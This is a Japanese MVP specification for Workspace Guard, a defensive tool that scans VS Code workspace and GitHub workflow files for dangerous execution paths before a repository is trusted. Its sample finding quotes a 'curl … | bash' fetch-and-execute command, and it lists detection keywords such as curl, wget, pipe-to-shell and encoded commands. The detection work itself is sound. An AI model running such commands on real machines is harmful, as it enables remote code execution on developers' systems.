# Workspace Guard 仕様書 v0.2

## 0. 文書目的

本書は、`Workspace Guard` の **MVP 実装開始用仕様** である。  
対象は、VS Code ワークスペースに埋め込まれた危険な設定・実行導線を、**信頼付与前**および**ワークスペース読込直後**に検出するためのツール群である。

本書は以下を定義する。

- 目的と非目的
- 脅威モデル
- スコープ
- findings 形式
- ルール方針
- CLI 仕様
- VS Code 拡張仕様
- Policy 仕様
- 実装構成
- MVP 受入基準

---

## 1. 背景と問題設定

VS Code は単なるテキストエディタではなく、workspace 設定、task、debug、MCP、各種拡張設定を通じて、ローカル環境に対する実行導線を持つ。  
このため、未知のリポジトリを開く行為は、設定ファイルを介した意図しない実行・接続・情報流出の入口になりうる。

典型的なリスク対象は以下である。

- `.vscode/tasks.json` による shell / process 実行
- `.vscode/launch.json` の `preLaunchTask` / `postDebugTask`
- `.vscode/mcp.json` によるローカルコマンド起動
- `.vscode/settings.json` や `*.code-workspace` による interpreter / server path 差し替え
- preview / webview / live server 系設定による悪性コンテンツ閲覧誘導
- `env` / `envFile` / URL / UNC path を通じた外部依存や秘密情報の持ち込み

この問題に対し、Workspace Guard は **静的・決定的ルール** により危険シグナルを検出し、人間のレビューを支援する。

---

## 2. 目的

### 2.1 主目的

1. VS Code ワークスペース内の危険な設定と実行導線を静的検出する。
2. `code .` の前段階で、信頼付与判断の材料を提示する。
3. CLI、CI、VS Code 拡張で同一の検査ロジックを使う。
4. finding ごとに根拠を明示し、レビュー可能性を高める。
5. Copilot / LLM は説明補助に限定し、主判定は deterministic に維持する。

### 2.2 非目的

1. リポジトリ全体の完全安全性保証
2. 任意コードの動的解析
3. すべての VS Code 拡張設定の網羅
4. AV / EDR / SAST の完全代替
5. OS 全体の侵害診断

---

## 3. 製品構成

Workspace Guard は次の 3 コンポーネントから構成する。

### 3.1 Core

責務は以下である。

- 対象ファイル探索
- JSON / JSONC 読込
- ルール適用
- findings 生成
- severity 判定
- text / json / sarif 形式変換

### 3.2 CLI

責務は以下である。

- リポジトリを開く前の事前走査
- CI / pre-commit / script 連携
- policy 適用
- 結果出力と終了コード管理

### 3.3 VS Code 拡張

責務は以下である。

- ワークスペースオープン時の自動走査
- 保存時再走査
- Problems パネル / diagnostics 表示
- finding の詳細表示
- Copilot 連携用 prompt / JSON の出力

---

## 4. 設計原則

### 4.1 Deterministic First

危険抽出はルールベースで行う。  
LLM は抽出や pass/fail 判定に用いない。

### 4.2 Open Before Trust

最重要ユースケースは「開く前に見る」である。  
そのため CLI は必須とする。

### 4.3 Shared Engine

CLI と拡張は同じ core を利用し、finding 差異を原則禁止する。

### 4.4 Evidence Required

すべての finding には、ファイル、位置、理由、証拠文字列を持たせる。

### 4.5 Conservative by Default

初版は false positive を一部許容しても、false negative を減らす方を優先する。

---

## 5. 脅威モデル

### 5.1 守る対象

- 開発端末のローカル環境
- 認証情報や `.env` 等の秘密情報
- 開発者の VS Code 実行文脈
- 未知の OSS / sample repo を開く前の判断

### 5.2 想定攻撃

1. task 経由の shell 実行
2. debug 実行前後の task 起動
3. workspace 設定による実行バイナリ差し替え
4. MCP server 設定によるローカル起動
5. preview / webview / HTML / SVG / notebook 誘導
6. URL / UNC / 外部コマンドを通じた接続や漏えい
7. allowlist / policy の誤用

### 5.3 対象外

- 拡張バイナリ内部のリバースエンジニアリング
- OS 権限昇格の一般問題
- ブラウザ本体や Node 本体の既知 CVE 管理
- build system 全般の包括解析
- 悪性 npm package / pip package 解析

---

## 6. 検査対象

### 6.1 MVP 対象

- `.vscode/settings.json`
- `.vscode/tasks.json`
- `.vscode/launch.json`
- `.vscode/mcp.json`
- `*.code-workspace`
- `.github/workflows/*.yml`
- `.github/dependabot.yml`
- `.github/CODEOWNERS`
- `.github/ISSUE_TEMPLATE/*`
- `.github/PULL_REQUEST_TEMPLATE*`

### 6.2 次段階対象

- `.vscode/extensions.json`
- `.devcontainer/devcontainer.json`
- `package.json` の `scripts`
- notebook metadata
- `Makefile`

---

## 7. finding モデル

```json
{
  "tool": "workspace-guard",
  "version": "0.2.0",
  "workspaceRoot": "/path/to/repo",
  "summary": {
    "high": 1,
    "medium": 2,
    "info": 1
  },
  "findings": [
    {
      "id": "WG-TASK-001",
      "severity": "high",
      "category": "task-execution",
      "file": ".vscode/tasks.json",
      "jsonPath": "$.tasks[0].command",
      "reason": "shell execution detected",
      "evidence": "curl https://example.invalid/install.sh | bash",
      "message": "外部取得とシェル実行の組み合わせを検出した。",
      "suggestedAction": "workspace task から削除し、手動手順へ移す。",
      "confidence": "high"
    }
  ]
}
```

### 7.1 必須フィールド

- `id`
- `severity`
- `category`
- `file`
- `jsonPath`
- `reason`
- `evidence`
- `message`
- `suggestedAction`
- `confidence`

### 7.2 severity

- `high`
- `medium`
- `info`

### 7.3 confidence

- `high`
- `medium`
- `low`

---

## 8. ルール方針

### 8.1 High

以下は原則 `high` とする。

#### tasks.json

- `type: "shell"`
- `command` に以下を含む
  - `curl`
  - `wget`
  - `bash`
  - `sh`
  - `cmd`
  - `powershell`
  - `pwsh`
  - `python`
  - `node`
  - `npx`
  - `docker`
- pipe 実行
  - `| bash`
  - `| sh`
- encoded command
- `dependsOn` による実行連鎖で危険 task を起動

#### launch.json

- `preLaunchTask`
- `postDebugTask`
- `runtimeExecutable`

#### GitHub workflow metadata

- `on: pull_request_target`
- `permissions: write-all`
- `contents: write`
- `packages: write`
- `actions: write`
- `id-token: write`
- commit SHA で pin されていない `uses:`
- `curl | bash`, `wget | sh`, `sudo`, `chmod +x`
- `runs-on: self-hosted`
- `pull_request_target` と `github.event.pull_request.head.*` checkout の組み合わせ
- `program` に実行導線がある
- `${workspaceFolder}` 経由の危険な起動
- URL / UNC path / shell 経由の疑い

#### mcp.json

- `command` の存在
- `args` に起動・接続・取得系コマンド
- `envFile`
- `env` に秘匿情報や接続先を示す値
- 外部依存コマンド起動

#### settings / code-workspace

- interpreter / executable / runtime / server path の上書き
- workspace スコープでのツール差し替え
- terminal profile の危険な上書き

### 8.2 Medium

以下は原則 `medium` とする。

- live preview / live server / browser preview 誘導
- webview / notebook / html preview 系設定
- remote 接続・port forwarding を前提とする設定
- Git / terminal / extension 動作を大きく変える設定
- 実行までは直結しないが、実行導線に近い設定

### 8.3 Info

以下は原則 `info` とする。

- theme
- formatter
- editor UI
- 軽微な workspace 設定差分

---

## 9. 危険キー辞書

### 9.1 settings 系キー

初版では以下のようなキーを監視対象とする。

- `python.defaultInterpreterPath`
- `python.pythonPath`
- `typescript.tsdk`
- `rust-analyzer.server.path`
- `go.alternateTools`
- `terminal.integrated.profiles.*`
- `terminal.external.*`
- `*command*`
- `*path*`
- `*executable*`
- `*runtime*`
- `*interpreter*`
- `*server.path*`

### 9.2 launch / tasks / mcp 系キー

- `command`
- `args`
- `env`
- `envFile`
- `options.env`
- `preLaunchTask`
- `postDebugTask`
- `runtimeExecutable`
- `program`
- `dependsOn`

---

## 10. ヒューリスティクス

### 10.1 危険文字列

- `curl`
- `wget`
- `Invoke-WebRequest`
- `bash`
- `sh`
- `cmd /c`
- `powershell`
- `pwsh`
- `python -c`
- `node -e`
- `npx`
- `docker run`
- `ssh`
- `scp`
- `http://`
- `https://`
- `\\`

### 10.2 危険パターン

- pipe 実行
- base64 / encoded command
- `${env:*}`
- `${input:*}`
- `${workspaceFolder}`
- 相対パス + 実行
- URL / UNC / 外部バイナリの組み合わせ

---

## 11. CLI 仕様

### 11.1 コマンド

```bash
workspace-guard scan <path>
workspace-guard scan <path> --format text
workspace-guard scan <path> --format json
workspace-guard scan <path> --format sarif
workspace-guard scan <path> --profile paranoid
workspace-guard explain <findings.json>
workspace-guard policy init
workspace-guard policy validate
```

### 11.2 オプション

- `--format text|json|sarif`
- `--profile minimal|balanced|paranoid`
- `--fail-on high|medium|info|none`
- `--output <file>`
- `--policy <file>`
- `--ignore <glob>`
- `--offline`
- `--no-color`

### 11.3 終了コード

- `0`: 閾値未満
- `1`: findings が閾値以上
- `2`: 実行時エラー
- `3`: policy エラー

### 11.4 期待動作

- `scan` は対象ファイル探索後、core ルールで finding を生成する。
- `--fail-on high` 指定時、`high` finding が 1 件でもあれば exit code 1 とする。
- `--format sarif` は GitHub Code Scanning 連携可能な形式を返す。
- `explain` は findings JSON を人間向け文章へ整形する。

---

## 12. Policy 仕様

### 12.1 目的

許可済みの finding または command を明示的に allowlist 化し、ノイズを減らす。

### 12.2 例

```json
{
  "$schema": "./schemas/policy.schema.json",
  "version": 1,
  "allowedFindings": [
    {
      "id": "WG-TASK-001",
      "file": ".vscode/tasks.json",
      "jsonPath": "$.tasks[1].command",
      "match": "npm run build"
    }
  ],
  "allowedCommands": [
    "npm run build",
    "pytest -q"
  ]
}
```

### 12.3 方針

- allow は明示的であること
- wildcard は最小限に制限すること
- file と jsonPath の両方を優先的に使うこと
- policy 自体もレビュー対象とすること

---

## 13. VS Code 拡張仕様

### 13.1 主機能

1. ワークスペースオープン時の自動走査
2. 対象ファイル保存時の再走査
3. Problems パネル表示
4. editor diagnostics
5. finding 詳細パネル
6. finding の JSON エクスポート
7. Copilot 用 prompt コピー
8. Quick Fix
   - workspace から削除提案
   - user settings への移動提案
   - policy 追加提案

### 13.2 コマンド

- `workspaceGuard.scanWorkspace`
- `workspaceGuard.scanCurrentFile`
- `workspaceGuard.showFindings`
- `workspaceGuard.exportFindingsJson`
- `workspaceGuard.copyPromptForCopilot`
- `workspaceGuard.openPolicy`
- `workspaceGuard.toggleAutoScan`

### 13.3 設定項目

- `workspaceGuard.enable`
- `workspaceGuard.autoScan`
- `workspaceGuard.profile`
- `workspaceGuard.failOn`
- `workspaceGuard.usePolicy`
- `workspaceGuard.policyPath`
- `workspaceGuard.showNotifications`
- `workspaceGuard.includeGlobs`
- `workspaceGuard.excludeGlobs`

### 13.4 activationEvents

- `workspaceContains:.vscode/tasks.json`
- `workspaceContains:.vscode/launch.json`
- `workspaceContains:.vscode/settings.json`
- `workspaceContains:.vscode/mcp.json`
- `onCommand:workspaceGuard.scanWorkspace`

### 13.5 Restricted Mode 方針

未信頼ワークスペースでも、**読み取り専用の静的検査**は許可する。  
ただし以下は禁止する。

- 外部コマンド実行
- ネットワークアクセス
- policy 自動変更
- Copilot 自動送信

---

## 14. Copilot / LLM 連携方針

### 14.1 原則

- LLM は主判定をしない。
- LLM は finding の説明、誤検知可能性、修正案の整理に限定する。

### 14.2 想定プロンプト

```text
Review the following Workspace Guard findings.
Explain:
1. possible attack path,
2. likely false positive risk,
3. safer alternative,
4. whether the configuration should remain in workspace scope.

<findings json>
```

### 14.3 禁止事項

- 自動 trust 判断
- findings の自動無視
- policy 自動更新
- repo 全体の安全宣言

---

## 15. 実装構成

### 15.1 推奨技術

- 言語: TypeScript
- Node.js: LTS
- パッケージ管理: pnpm 推奨
- 構成: monorepo

### 15.2 推奨ディレクトリ

```text
workspace-guard/
  README.md
  LICENSE
  package.json
  pnpm-workspace.yaml
  tsconfig.base.json

  packages/
    core/
      src/
        scanner/
        rules/
        models/
        formatters/
      package.json

    cli/
      src/
        index.ts
      package.json

    vscode-extension/
      src/
        extension.ts
        diagnostics.ts
        commands.ts
        providers/
      package.json

  schemas/
    findings.schema.json
    policy.schema.json

  docs/
    spec.md
    threat-model.md
    rule-catalog.md

  test/
    fixtures/
      safe/
      suspicious/
      malicious-like/
```

---

## 16. テスト戦略

### 16.1 単体テスト

- ルール単位の finding 発生確認
- JSON path 抽出確認
- severity 判定確認
- variable pattern 検出確認

### 16.2 フィクスチャテスト

- safe
- suspicious
- malicious-like
- broken JSON / JSONC

### 16.3 拡張 E2E

- ワークスペースオープン時走査
- 保存時再走査
- Problems 表示
- Policy 適用
- Restricted Mode 動作

### 16.4 一貫性テスト

- CLI と拡張で同一 finding が出ること
- core 更新で回帰が起きないこと

---

## 17. MVP 受入基準

以下を満たしたら MVP とする。

1. 5 種の対象ファイルを走査できる。
2. `high / medium / info` を出し分けできる。
3. `text / json / sarif` 出力ができる。
4. `--fail-on high` が動作する。
5. policy による例外許可ができる。
6. VS Code 拡張で Problems 表示ができる。
7. Restricted Mode で外部実行せず動作する。
8. finding に file / jsonPath / evidence が入る。
9. CLI と拡張で同一ルールを使う。

---

## 18. 実装順序

### 18.1 Phase 1

1. monorepo 初期化
2. finding モデル定義
3. file discovery
4. JSON / JSONC 読込
5. 基本ルール実装
   - tasks
   - launch
   - mcp
   - settings
6. CLI の text / json 出力
7. fixture テスト整備

### 18.2 Phase 2

1. policy 機能
2. sarif 出力
3. VS Code diagnostics
4. コマンド実装
5. README / examples / screenshots

### 18.3 Phase 3

1. `.devcontainer/` 対応
2. `extensions.json` 対応
3. GitHub Action
4. community rule pack
5. signed policy

---

## 19. README 冒頭文案

> Workspace Guard detects suspicious execution paths hidden in VS Code workspace files before you trust or run them.
> It scans `.vscode/settings.json`, `tasks.json`, `launch.json`, `mcp.json`, and `*.code-workspace`, then reports actionable findings for CLI, CI, and VS Code.

---

## 20. 既知の限界

1. ルールベースなので誤検知はある。
2. 難読化された実行導線は見逃しうる。
3. 拡張固有設定の網羅は初版では不完全である。
4. workspace 外の build script や package install は別問題である。
5. benign な task でも High になりうる。

---

## 21. リリース順

1. `@workspace-guard/core`
2. `workspace-guard` CLI
3. `Workspace Guard` VS Code extension
4. GitHub Action
5. policy templates / rule packs

---

## 22. ライセンス候補

候補は以下である。

- MIT
- Apache-2.0

MVP では MIT を推奨する。  
理由は導入障壁が低く、CLI / 拡張 / CI のいずれにも乗せやすいためである。

---

## 23. 結論

Workspace Guard の最適構成は以下である。

- **主判定**: deterministic な core
- **開く前**: CLI
- **開いた後**: VS Code 拡張
- **説明補助**: Copilot / LLM

この構成により、VS Code ワークスペース由来の危険シグナルを、低コストかつ継続的に検査できる。
